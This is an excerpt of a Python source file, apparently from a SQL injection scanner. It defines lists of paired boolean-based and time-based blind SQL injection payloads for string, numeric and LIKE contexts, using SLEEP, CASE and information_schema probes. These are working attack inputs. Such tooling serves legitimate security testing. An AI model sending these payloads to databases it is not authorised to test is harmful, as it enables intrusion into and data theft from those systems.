...
BOOLEAN_STRING: List[Payload] = [
    ...
    {"type": "BOOLEAN", "family": "exists_tables",     "bool_side": "probe", "payload": "' AND EXISTS(SELECT * FROM information_schema.tables)-- -"},
    {"type": "BOOLEAN", "family": "case_true",         "pair_id": "string_case_basic", "bool_side": "true", "payload": "' AND CASE WHEN (1=1) THEN 1 ELSE 0 END-- -"},
    {"type": "BOOLEAN", "family": "case_false",        "pair_id": "string_case_basic", "bool_side": "false", "payload": "' AND CASE WHEN (1=2) THEN 1 ELSE 0 END-- -"},
...
BOOLEAN_NUMERIC: List[Payload] = [
    ...
    {"type": "BOOLEAN", "family": "num_and_false",     "pair_id": "numeric_and_basic", "bool_side": "false", "payload": "1 AND 1=2"},
...
TIME_BASED_STRING: List[Payload] = [
    ...
    {"type": "TIME_BASED", "family": "if_sleep_true",      "pair_id": "time_string_if_basic", "bool_side": "sleep", "payload": f"' AND IF(1=1,SLEEP({_SLEEP}),0)-- -"},
    {"type": "TIME_BASED", "family": "if_sleep_false",     "pair_id": "time_string_if_basic", "bool_side": "no_sleep", "payload": f"' AND IF(1=2,SLEEP({_SLEEP}),0)-- -"},
    {"type": "TIME_BASED", "family": "case_sleep",         "pair_id": "time_string_case_basic", "bool_side": "sleep", "payload": f"' AND CASE WHEN (1=1) THEN SLEEP({_SLEEP}) ELSE 0 END-- -"},
    {"type": "TIME_BASED", "family": "case_no_sleep",      "pair_id": "time_string_case_basic", "bool_side": "no_sleep", "payload": f"' AND CASE WHEN (1=2) THEN SLEEP({_SLEEP}) ELSE 0 END-- -"},
...
TIME_BASED_NUMERIC: List[Payload] = [
    ...
    {"type": "TIME_BASED", "family": "num_if_sleep",       "pair_id": "time_numeric_if_basic", "bool_side": "sleep", "payload": f"0 OR IF(1=1,SLEEP({_SLEEP}),0)"},
    {"type": "TIME_BASED", "family": "num_if_no_sleep",    "pair_id": "time_numeric_if_basic", "bool_side": "no_sleep", "payload": f"0 OR IF(1=2,SLEEP({_SLEEP}),0)"},
    {"type": "TIME_BASED", "family": "num_case_sleep",     "pair_id": "time_numeric_case_basic", "bool_side": "sleep", "payload": f"0 OR CASE WHEN (1=1) THEN SLEEP({_SLEEP}) ELSE 0 END"},
    {"type": "TIME_BASED", "family": "num_case_no_sleep",  "pair_id": "time_numeric_case_basic", "bool_side": "no_sleep", "payload": f"0 OR CASE WHEN (1=2) THEN SLEEP({_SLEEP}) ELSE 0 END"},
...
BLIND_SQLI: Dict[str, List[Payload]] = {
    ...
    "like_string": [
        ...
        {"type": "TIME_BASED", "family": "paren_sleep",       "bool_side": "sleep", "payload": "%') AND SLEEP(5)-- -"},
